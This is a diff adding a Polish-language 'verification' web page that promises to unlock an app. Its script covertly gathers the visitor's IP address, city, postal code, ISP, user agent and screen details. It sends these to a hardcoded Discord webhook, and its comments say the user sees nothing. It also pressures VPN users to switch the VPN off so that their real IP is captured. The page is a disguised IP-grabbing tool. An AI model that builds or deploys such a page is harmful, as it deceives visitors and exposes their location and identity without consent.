@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Weryfikacja</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.06);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 24px;
+    padding: 48px 40px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .icon {
+    width: 80px; height: 80px;
+    margin: 0 auto 24px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 38px;
+    box-shadow: 0 8px 30px rgba(102,126,234,0.5);
+    transition: all 0.4s;
+  }
+  .icon.success { background: linear-gradient(135deg, #22c55e, #16a34a); box-shadow: 0 8px 30px rgba(34,197,94,0.5); }
+  .icon.error { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 8px 30px rgba(239,68,68,0.5); }
+  h1 { font-size: 26px; margin-bottom: 12px; font-weight: 700; }
+  p.sub { color: #b8b8d0; font-size: 15px; margin-bottom: 32px; line-height: 1.6; }
+  button {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 8px 24px rgba(102,126,234,0.4);
+  }
+  button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(102,126,234,0.6); }
+  button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .status {
+    margin-top: 28px;
+    padding: 20px;
+    border-radius: 14px;
+    background: rgba(0,0,0,0.3);
+    font-size: 15px;
+    line-height: 1.6;
+    display: none;
+    animation: fadeIn 0.4s ease;
+  }
+  .status.show { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+  .status.success { border: 1px solid rgba(34,197,94,0.4); color: #4ade80; }
+  .status.error { border: 1px solid rgba(239,68,68,0.4); color: #f87171; }
+  .status.info { border: 1px solid rgba(102,126,234,0.4); color: #a5b4fc; }
+
+  .spinner {
+    display: inline-block; width: 16px; height: 16px;
+    border: 2px solid rgba(102,126,234,0.3);
+    border-top-color: #667eea;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="icon" id="icon">🔒</div>
+  <h1 id="title">Weryfikacja</h1>
+  <p class="sub" id="subtitle">Kliknij przycisk poniżej, aby zweryfikować się i odebrać aplikację.</p>
+
+  <button id="verifyBtn" onclick="verify()">Zweryfikuj się</button>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// 🔧 ZMIEŃ NA SWÓJ WEBHOOK
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1557031206443425843/gvsjLhLhkqWG_9YuTFySusWBz_NcJEx6hJAwNLCZqoQ4I39wPIr48zISZeta7OYA1z3T";
+
+async function verify() {
+  const btn = document.getElementById("verifyBtn");
+  const statusEl = document.getElementById("status");
+  const icon = document.getElementById("icon");
+
+  btn.disabled = true;
+  btn.textContent = "Weryfikacja...";
+  icon.className = "icon";
+  icon.textContent = "🔒";
+  statusEl.className = "status info show";
+  statusEl.innerHTML = `<span class="spinner"></span>Trwa weryfikacja, proszę czekać...`;
+
+  try {
+    // 1. Pobierz dane IP
+    const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+    // 2. Analiza VPN/proxy (rozszerzona heurystyka)
+    const analysis = analyzeConnection(ipData);
+
+    // 3. Szczegółowy payload – TYLKO na webhook
+    const payload = {
+      content: "🔔 **Nowa weryfikacja**",
+      embeds: [{
+        title: "📊 Szczegółowa analiza weryfikacji",
+        color: analysis.vpn_detected ? 0xef4444 : 0x22c55e,
+        fields: [
+          { name: "🌐 IP", value: `\`${ipData.ip || "brak"}\``, inline: true },
+          { name: "🏳️ Kraj", value: ipData.country_name || "brak", inline: true },
+          { name: "🏙️ Miasto", value: ipData.city || "brak", inline: true },
+          { name: "📍 Region", value: ipData.region || "brak", inline: true },
+          { name: "📮 Kod pocztowy", value: ipData.postal || "brak", inline: true },
+          { name: "🕐 Strefa czasowa", value: ipData.timezone || "brak", inline: true },
+          { name: "🏢 ISP / Org", value: ipData.org || "brak", inline: false },
+          { name: "🔢 ASN", value: ipData.asn || "brak", inline: true },
+          { name: "💻 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+          { name: "🗣️ Język", value: navigator.language, inline: true },
+          { name: "🖥️ Rozdzielczość", value: `${screen.width}x${screen.height}`, inline: true },
+          { name: "🚨 VPN/Proxy", value: analysis.vpn_detected ? "**TAK** ⚠️" : "Nie ✅", inline: true },
+          { name: "📝 Powód", value: analysis.reason, inline: false },
+          { name: "⚠️ Ryzyko", value: `${analysis.risk_score}/100`, inline: true },
+          { name: "🕒 Czas", value: new Date().toLocaleString("pl-PL"), inline: true }
+        ],
+        footer: { text: "System weryfikacji" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    // 4. Wyślij TYLKO na webhook – użytkownik nic nie widzi
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    // 5. Użytkownik widzi tylko ogólny wynik
+    if (analysis.vpn_detected) {
+      showError();
+    } else {
+      showSuccess();
+    }
+
+  } catch (err) {
+    statusEl.className = "status error show";
+    statusEl.innerHTML = `❌ Wystąpił błąd weryfikacji. Spróbuj ponownie później.`;
+    icon.className = "icon error";
+    icon.textContent = "✖";
+    btn.disabled = false;
+    btn.textContent = "Spróbuj ponownie";
+  }
+}
+
+// Rozszerzona analiza połączenia
+function analyzeConnection(data) {
+  let detected = false;
+  let reason = "Brak podejrzanych sygnałów";
+  let risk = 0;
+
+  const vpnKeywords = [
+    "vpn", "proxy", "hosting", "datacenter", "data center", "cloud",
+    "server", "digitalocean", "ovh", "hetzner", "linode", "aws",
+    "amazon", "google cloud", "microsoft azure", "m247", "nordvpn",
+    "expressvpn", "surfshark", "cyberghost", "ipvanish", "purevpn",
+    "private internet", "tor exit", "colocation", "colo", "leaseweb"
+  ];
+
+  const org = (data.org || "").toLowerCase();
+  const asn = (data.asn || "").toLowerCase();
+  const combined = org + " " + asn;
+
+  const matched = vpnKeywords.filter(k => combined.includes(k));
+  if (matched.length > 0) {
+    detected = true;
+    reason = `Dostawca pasuje do listy VPN/hosting: ${matched.join(", ")}`;
+    risk += 70;
+  }
+
+  // Heurystyka: brak miasta/kodu = często VPN
+  if (!data.city && !data.postal) {
+    risk += 15;
+    if (!detected) reason = "Brak danych o lokalizacji (podejrzane)";
+  }
+
+  // Heurystyka: nietypowy kraj dla języka PL
+  if (navigator.language.startsWith("pl") && data.country_code && data.country_code !== "PL") {
+    risk += 10;
+    if (!detected) reason = "Niezgodność języka z lokalizacją";
+  }
+
+  if (risk >= 50) detected = true;
+  risk = Math.min(risk, 100);
+
+  return { vpn_detected: detected, reason, risk_score: risk };
+}
+
+function showSuccess() {
+  const icon = document.getElementById("icon");
+  const title = document.getElementById("title");
+  const subtitle = document.getElementById("subtitle");
+  const statusEl = document.getElementById("status");
+  const btn = document.getElementById("verifyBtn");
+
+  icon.className = "icon success";
+  icon.textContent = "✔";
+  title.textContent = "Zweryfikowano!";
+  subtitle.textContent = "Twoja aplikacja została pomyślnie odebrana.";
+  statusEl.className = "status success show";
+  statusEl.innerHTML = `✅ Weryfikacja zakończona pomyślnie.<br>Aplikacja została odblokowana.`;
+
+  btn.style.display = "none";
+}
+
+function showError() {
+  const icon = document.getElementById("icon");
+  const title = document.getElementById("title");
+  const subtitle = document.getElementById("subtitle");
+  const statusEl = document.getElementById("status");
+  const btn = document.getElementById("verifyBtn");
+
+  icon.className = "icon error";
+  icon.textContent = "✖";
+  title.textContent = "Weryfikacja nieudana";
+  subtitle.textContent = "Wykryto niedozwolone połączenie.";
+  statusEl.className = "status error show";
+  statusEl.innerHTML = `❌ Nie możemy zweryfikować Twojej sesji.<br>Wyłącz VPN/proxy i spróbuj ponownie.`;
+
+  btn.disabled = false;
+  btn.textContent = "Spróbuj ponownie";
+}
+</script>
+
+</body>
+</html>
